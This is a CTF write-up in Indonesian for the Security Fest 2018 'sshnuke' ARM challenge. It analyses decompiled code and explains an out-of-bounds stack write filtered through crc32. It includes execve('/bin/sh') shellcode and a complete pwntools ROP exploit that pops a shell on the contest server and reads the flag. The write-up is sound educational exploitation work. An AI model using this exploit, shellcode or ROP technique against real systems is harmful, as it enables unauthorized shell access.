+++
title = "Security Fest CTF 2018 - sshnuke"
date = "2018-06-02"
categories = ["rev", "writeup"]
+++

> Security Fest CTF 2018 - sshnuke
>
> https://nmap.org/movies/matrix/matrix-nmap.mp4 . The flag is in /home/ctf/flag.
>
>
> Attachment : placcholder

```sh
$ cat ./run-dbg.sh
socat TCP4-LISTEN:5555,fork,tcpwrap=script EXEC:"./qemu-arm -g 3333 -nx ./sshnuke",pty,stderr&

$ file ./sshnuke
./sshnuke: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), statically linked, for GNU/Linux 3.2.0, BuildIDsha1]=e76163966885ee563300455e4cd3c1d1e309234b, not stripped
```


```
Nmap run completed --- 1 IP address (1 host up) scanned
# sshnuke 10.2.2.2 -rootpw='Z10N0101'

Connecting to 10.2.2.2:ssh ... successful.
Attempting to exploit SSHv1 CRC32 ... successful.
Loading backdoor ... successful.
Login: 

...

BACKDOOR MENU 
 1) Store secret data
 2) Read secret data
 3) Run payload
 4) Quit
 #nana@RRF-CONTROL>

...

Select storage slot: .. 
Data for storage: ..
[+] Stored .... in slot ...
Store more? (y/n): ..
```

## Analisa

Binary ARM static-link, `NX` enabled karena saat dijalankan dengan `./qemu-arm` digunakan opsi `-nx`.  Programnya punya 4 fungsi, `store`, `read`, `run_payload`, `quit`. Fungsi `run_payload` disini sebenarnya agak _misleading_ karena yang dilakukan hanya memanggil `sleep()` dan fungsi `quit`, well,  hanya keluar dari program.

Fungsi `store data`, yang unik dari dari fungsi ini, data yang disimpan bukan berupa raw data, tapi berupa hash crc32 dari data. crc32 sendiri masih berupa crc32 yang "_normal_" karena konstanta `poly = 0x04c11db7`.
```c
int crc32(unsigned int8 *buf, int len)
{
  unsigned int init; // [sp+10h] [bp-1Ch]
  unsigned int v4; // [sp+14h] [bp-18h]
  signed int i; // [sp+18h] [bp-14h]
  signed int j; // [sp+1Ch] [bp-10h]
  unsigned int8 *c_buf; // [sp+20h] [bp-Ch]

  if ( !has_table )                             // generate_crc_table
  {
    for ( i = 0; i <= 0xFF; ++i )
    {
      v4 = i;
      for ( j = 0; j <= 7; ++j )
      {
        if ( v4 & 1 )
          v4 = (v4 >> 1) ^ 0xEDB88320;
        else
          v4 >>= 1;
      }
      crc_table[i] = v4;
    }
    has_table = 1;
  }
  init = 0xFFFFFFFF;                            // calc_crc_32
  for ( cbuf = buf; cbuf < &buf[len]; ++cbuf )
    init = crc_table[*cbuf ^ (unsigned int8)init] ^ (init >> 8);
  return ~init;
}

unsigned int do_store()
{
  size_t v0; // r2
  int v1; // r0

  memset(&data_5948, 0, 256);
  read((int)&data_5948, (void *)0x100, v0);
  v1 = strlen(&data_5948);
  return crc32((unsigned __int8 *)&data_5948, v1 - 1);
}

void store()
{
  int v0; // r4
  char v1[12]; // [sp+30h] [bp-Ch]
  do
  {
    write_str("Select storage slot: ");
    storage_index_5959 = select_slot();
    write_str("Data for storage: ");
    v0 = storage_index_5959;
    *(_DWORD_ *)&v1[4 * v0 - 44] = do_store();
    printf("\x1b[32m+\x1b[0m] Stored %x in slot %d", *(_DWORD *)&v1[4 * storage_index_5959 - 44], storage_index_5959);
    write_str("Store more? (y/n): ");
  }
  while ( read_answer() );
}
```

Fungsi `read data`, ga ada yang unik dari fungsi ini selain membaca data pada `v1` (stack).

```c
void read_store()
{
  char v0[4]; // [sp+30h] [bp-4h]

  write_str("Select slot to read from: ");
  storage_index_5968 = select_slot();
  printf("[\x1b[32m+\x1b[0m] Read %x from slot %d\n", *(_DWORD *)&v0[4 * storage_index_5968 - 44], storage_index_5968);
}
```

---

## Bug

Bug program ini ada pada fungsi `store` dan `read_store`, yakni array out-of-bound karena tidak ada pengecekan pada batasan pada `v0`. Sebagai ilustrasi, mis. `v0 = 14` => `v1[4 * v0 - 44]` => __`v1[20]`__. `v[16] => bp` (mirip ebp kalau di x86), `v[20] => pc` (mirip saved eip kalau di x86)

```c
  char v1[12]; // [sp+30h] [bp-Ch]
...
  storage_index_5959 = select_slot();
...
  v0 = storage_index_5959;
  *(_DWORD_ *)&v1[4 * v0 - 44] = do_store(); // out-of-bound
...
```

```c
...
  char v0[4]; // [sp+30h] [bp-4h]
...
  storage_index_5968 = select_slot();
  printf("[\x1b[32m+\x1b[0m] Read %x from slot %d\n", *(_DWORD *)&v0[4 * storage_index_5968 - 44], storage_index_5968);
...
```

---

## Attacc
<center><b>He protecc, He attacc, but most importantly he got da flacc.</b></center>

Ok, udah tahu bugnya, gimana cara exploit-nya? bisa `write_to_stack` dimana aja relatif terhadap `v0`/`v1`. Nah, karena binary ini `NX` enabled jadi yang bisa dilakukan itu ROP. Sebagai gambaran, ROP yang mau dicapai itu execve, (shellcode diambil dari azeria-labs)

```asm
.section .text
.global _start

_start:
        add r0, pc, #12
        mov r1, #0
        mov r2, #0
        mov r7, #11
        svc #0

.ascii "/bin/sh\0"
```

Sebelum bahasan agak lebih jauh, `write_to_stack` ini sendiri ada batasannya juga, data yang ditulis di stack itu crc32 dari data yang di input. Agak sedikit tricky, untungnya ada tools dari <http://reveng.sourceforge.net> untuk reverse crc32.

ROP di arm sebenernya ga jauh beda dengan ROP di x86, intinya sama harus cari gadgets yang "_reliable_" untuk kontrol pc dan register. Baca lanjut yang lebih jelas ke <https://azeria-labs.com/> untuk ARM exploitations.

---

## Final Exploit

gadgets yang dipakai untuk final exploit ini gak langsung `pop` semua register karena untuk menghindari bad bytes saat _transmisi data?_

```py
#r = remote('127.0.0.1', 5555)
r = remote('159.65.80.92', 31337)

raw_input('[ENTER TO CONTINUE]')

def write_to_stack(pos, buf, more=True):
    r.sendlineafter('slot: ', str(pos))
    r.sendlineafter('storage: ', buf)
    print r.recvline(keepends=False)
    r.sendline('y' if more else 'n')

def reverse_crc32(x):
    buf = (((x << 24) & 0xFF000000) | ((x <<  8) & 0x00FF0000) | ((x >>  8) & 0x0000FF00) | ((x >> 24) & 0x000000FF))
    buf = hex(buf)[2:].rjust(8, '0')
    m = process(['./reveng/reveng', '-m', 'crc-32', '-v', buf])
    ret = m.recvline(keepends=False)
    m.close()
    return ret.decode('hex')

context.log_level = 'WARN'

payload = '/bin/sh\x00'
payload += p32(0x0006ef8c)
payload += p32(0x0006ef8c)
payload += p32(0x0006ef8c)

r.sendline(payload) #login
r.sendline('1') # menu store

write_to_stack(13, reverse_crc32(0x00099014)) # fp

# pop {r0, r1, r3, ip, lr}; pop {r2}; ldr r1, [r0, #4]; bx r1;
write_to_stack(14, reverse_crc32(0x0005ab18)) # pc
write_to_stack(15, reverse_crc32(0x00099020)) # r0
write_to_stack(16, '') # r1
write_to_stack(17, reverse_crc32(0x0006ef8c)) # r3
write_to_stack(18, '') # ip
write_to_stack(19, reverse_crc32(0x0001a194)) # lr
write_to_stack(20, '') # r2

# pop {r0, pc}
write_to_stack(21, reverse_crc32(0x00099014)) # r0
write_to_stack(22, reverse_crc32(0x0006e810)) # pc

# sub r1, r1, r3; bx lr;

# pop {r7, pc}
write_to_stack(23, reverse_crc32(11))
write_to_stack(24, reverse_crc32(0x0004e8a8), more=False)

# svc 0

r.interactive()
```

```sh
λ › python solve.py
[+] Opening connection to 159.65.80.92 on port 31337: Done
[ENTER TO CONTINUE]
[+] Stored 99014 in slot 13
[+] Stored 5ab18 in slot 14
[+] Stored 99020 in slot 15
[+] Stored 0 in slot 16
[+] Stored 6ef8c in slot 17
[+] Stored 0 in slot 18
[+] Stored 1a194 in slot 19
[+] Stored 0 in slot 20
[+] Stored 99014 in slot 21
[+] Stored 6e810 in slot 22
[+] Stored b in slot 23
[+] Stored 4e8a8 in slot 24
Store more? (y/n): $ n
sh: 1: n: not found
$ id
uid=999(ctf) gid=999(ctf) groups=999(ctf)
$ cat /home/ctf/flag
sctf{pUts_0n_sh4d3s_w3r3_1n}
$ 
[*] Closed connection to 159.65.80.92 port 31337
```
<center>`FLAG : sctf{pUts_0n_sh4d3s_w3r3_1n}`</center>

---

## Some Failed Attack Ideas

Awalnya mau pakai teknik ROP dengan `stack pivot` tapi ternyata gadgets untuk mengontrol `sp` kurang bagus karena entah kenapa stack dan bss jadi berantakan. Sebelum pakai tools `reveng` untuk reverse crc32 perhitungan masih dilakukan secara manual, ini agak makan waktu banyak juga karena kalau buat database crc32 perlu space besar dan perhitungan manual itu perlu makan banyak waktu :(.